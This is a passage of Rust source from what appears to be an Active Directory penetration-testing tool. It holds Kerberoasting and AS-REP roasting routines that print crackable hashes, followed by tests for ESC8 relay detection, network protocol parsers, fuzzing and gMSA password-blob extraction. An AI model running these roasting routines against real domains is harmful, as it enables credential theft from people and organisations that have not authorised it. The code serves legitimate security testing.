            match adhammer_kerberos::get_tgt(&a.user, &a.password, &realm, kdc).await {
                Err(e) => eprintln!("  TGT acquisition failed: {e}"),
                Ok(tgt) => {
                    for c in &kerberoast {
                        let spn = c.spn.as_deref().unwrap_or_default();
                        match adhammer_kerberos::roast_spn(&tgt, &c.sam, spn, kdc).await {
                            Ok(hash) => println!("{hash}"),
                            Err(e) => eprintln!("  {}: {e}", c.sam),
                        }
                    }
                }
            }
        }
        Some(_) => {}
    }

    println!("== AS-REP roastable ({}) ==", asrep.len());
    match &a.kdc {
        None => {
            for c in &asrep {
                println!("  {}", c.sam);
            }
            if !asrep.is_empty() {
                eprintln!("(pass --kdc <host> to fetch hashcat 18200 hashes)");
            }
        }
        Some(kdc) => {
            for c in &asrep {
                match adhammer_kerberos::asrep_roast(c, kdc).await {
                    Ok(hash) => println!("{hash}"),
                    Err(e) => eprintln!("  {}: {e}", c.sam),
                }
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod net_tests {
    use super::*;

    #[test]
    fn esc8_classifier() {
        let vuln = "HTTP/1.1 401 Unauthorized\r\nServer: Microsoft-IIS/10.0\r\nWWW-Authenticate: Negotiate\r\nWWW-Authenticate: NTLM\r\n\r\n";
        assert!(is_esc8_response(vuln), "cleartext NTLM 401 = ESC8");
        // 200 (anonymous), or a 401 without NTLM (e.g. Basic only), is not the ESC8 surface.
        assert!(!is_esc8_response("HTTP/1.1 200 OK\r\n\r\n"));
        assert!(!is_esc8_response(
            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic\r\n\r\n"
        ));
    }

    #[test]
    fn ber_lengths() {
        assert_eq!(ber(0x02, &[0x2a]), vec![0x02, 0x01, 0x2a]);
        let long = vec![0u8; 200];
        let e = ber(0x04, &long);
        assert_eq!(&e[..2], &[0x04, 0x81]); // 1-byte extended length
        assert_eq!(e[2], 200);
        let longer = vec![0u8; 300];
        let e2 = ber(0x04, &longer);
        assert_eq!(&e2[..2], &[0x04, 0x82]); // 2-byte extended length
        assert_eq!(u16::from_be_bytes([e2[2], e2[3]]), 300);
    }

    #[test]
    fn rpc_record_marker_last_fragment() {
        let f = rpc_frame(&[1, 2, 3, 4]);
        assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 0x8000_0004);
        assert_eq!(&f[4..], &[1, 2, 3, 4]);
    }

    #[test]
    fn snmp_extracts_last_octet_string() {
        // Hand-build an SNMPv1 GetResponse and confirm the walker returns sysDescr, not community.
        let oid = ber(0x06, &[0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]);
        let val = ber(0x04, b"Linux router 5.10");
        let vb = ber_seq(&[ber_seq(&[oid, val].concat())].concat());
        let pdu_body = [ber(0x02, &[0x2a]), ber(0x02, &[0]), ber(0x02, &[0]), vb].concat();
        let pdu = ber(0xa2, &pdu_body); // GetResponse
        let msg = ber_seq(&[ber(0x02, &[0]), ber(0x04, b"public"), pdu].concat());
        assert_eq!(
            snmp_first_octet_string(&msg).as_deref(),
            Some("Linux router 5.10")
        );
    }

    #[test]
    fn parse_exports_walks_chain() {
        fn be(v: u32) -> [u8; 4] {
            v.to_be_bytes()
        }
        let mut body = vec![0u8; 24]; // RPC accepted-reply header
                                      // export 1: "/data", no groups
        body.extend_from_slice(&be(1));
        body.extend_from_slice(&be(5));
        body.extend_from_slice(b"/data\0\0\0"); // padded to 8
        body.extend_from_slice(&be(0)); // group list end
                                        // export 2: "/exports", one group "*"
        body.extend_from_slice(&be(1));
        body.extend_from_slice(&be(8));
        body.extend_from_slice(b"/exports");
        body.extend_from_slice(&be(1)); // group present
        body.extend_from_slice(&be(1));
        body.extend_from_slice(b"*\0\0\0");
        body.extend_from_slice(&be(0)); // group list end
        body.extend_from_slice(&be(0)); // export list end
        let ex = parse_exports(&body);
        assert_eq!(ex, vec!["/data".to_string(), "/exports".to_string()]);
    }

    /// Tiny deterministic PRNG (xorshift64*) so any fuzz failure reproduces from its seed.
    struct Rng(u64);
    impl Rng {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 >> 12;
            self.0 ^= self.0 << 25;
            self.0 ^= self.0 >> 27;
            self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
        }
        fn bytes(&mut self, max: usize) -> Vec<u8> {
            let n = (self.next() as usize) % (max + 1);
            (0..n).map(|_| self.next() as u8).collect()
        }
    }

    /// Feed random + seed-mutated byte buffers to a parser; fail with a repro on any panic.
    fn fuzz<F: Fn(&[u8]) + std::panic::RefUnwindSafe>(name: &str, seeds: &[&[u8]], f: F) {
        let prev = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {})); // silence expected-during-fuzz panic spew
        let mut rng = Rng(0x9E37_79B9_7F4A_7C15 ^ name.bytes().map(|b| b as u64).sum::<u64>());
        let mut fail = None;
        for _ in 0..200_000 {
            // Half pure-random, half a mutated copy of a valid seed.
            let mut buf = rng.bytes(320);
            if !seeds.is_empty() && rng.next() & 1 == 0 {
                let mut s = seeds[(rng.next() as usize) % seeds.len()].to_vec();
                for _ in 0..(rng.next() as usize % 8) {
                    if !s.is_empty() {
                        let i = (rng.next() as usize) % s.len();
                        s[i] = rng.next() as u8;
                    }
                }
                buf = s;
            }
            let b = buf.clone();
            if std::panic::catch_unwind(|| f(&b)).is_err() {
                fail = Some(buf);
                break;
            }
        }
        std::panic::set_hook(prev);
        if let Some(buf) = fail {
            panic!(
                "{name} PANICKED on input ({} bytes): {}",
                buf.len(),
                hex_dump(&buf)
            );
        }
    }

    fn hex_dump(b: &[u8]) -> String {
        b.iter().map(|x| format!("{x:02x}")).collect()
    }

    #[test]
    fn fuzz_network_parsers() {
        // These parse bytes from arbitrary remote hosts (SNMP/NFS/TDS) — must never panic.
        let snmp_seed = ber_seq(&[ber(0x02, &[0]), ber(0x04, b"public"), ber(0xa2, &[])].concat());
        fuzz("snmp_first_octet_string", &[&snmp_seed], |b| {
            let _ = snmp_first_octet_string(b);
        });
        let mut nfs_seed = vec![0u8; 24];
        nfs_seed.extend_from_slice(&[0, 0, 0, 1, 0, 0, 0, 5]);
        nfs_seed.extend_from_slice(b"/data\0\0\0");
        fuzz("parse_exports", &[&nfs_seed], |b| {
            let _ = parse_exports(b);
        });
        fuzz("parse_prelogin", &[], |b| {
            let _ = parse_prelogin(b);
        });
    }

    #[test]
    fn managed_password_blob_extracts_current() {
        let mut b = vec![1, 0, 0, 0]; // version + reserved
        b.extend_from_slice(&0u32.to_le_bytes()); // length
        b.extend_from_slice(&16u16.to_le_bytes()); // CurrentPasswordOffset
        b.extend_from_slice(&0u16.to_le_bytes()); // PreviousPasswordOffset = none
        b.extend_from_slice(&0u16.to_le_bytes()); // QueryPasswordInterval
        b.extend_from_slice(&0u16.to_le_bytes()); // UnchangedPasswordInterval
        b.extend_from_slice(&[0xAB; 256]); // CurrentPassword
        let pw = parse_managed_password_blob(&b).unwrap();
        assert_eq!(pw.len(), 256);
        assert!(pw.iter().all(|&x| x == 0xAB));
    }

    #[test]
    fn prelogin_reads_version_and_encryption() {
        // VERSION @12 (16.0.1000), ENCRYPTION @18 = 0x03 (REQUIRED).
        let mut body = vec![
            0x00, 0x00, 12, 0x00, 6, // VERSION token
            0x01, 0x00, 18, 0x00, 1,    // ENCRYPTION token
            0xff, // terminator
        ];
        while body.len() < 12 {
            body.push(0);
        }
        body.extend_from_slice(&[16, 0, 0x03, 0xe8, 0, 0]); // 16.0.1000
        body.push(0x03); // ENCRYPT_REQ
        let (v, e) = parse_prelogin(&body);
        assert_eq!(v.as_deref(), Some("16.0.1000"));
        assert_eq!(e, Some(0x03));
    }
}
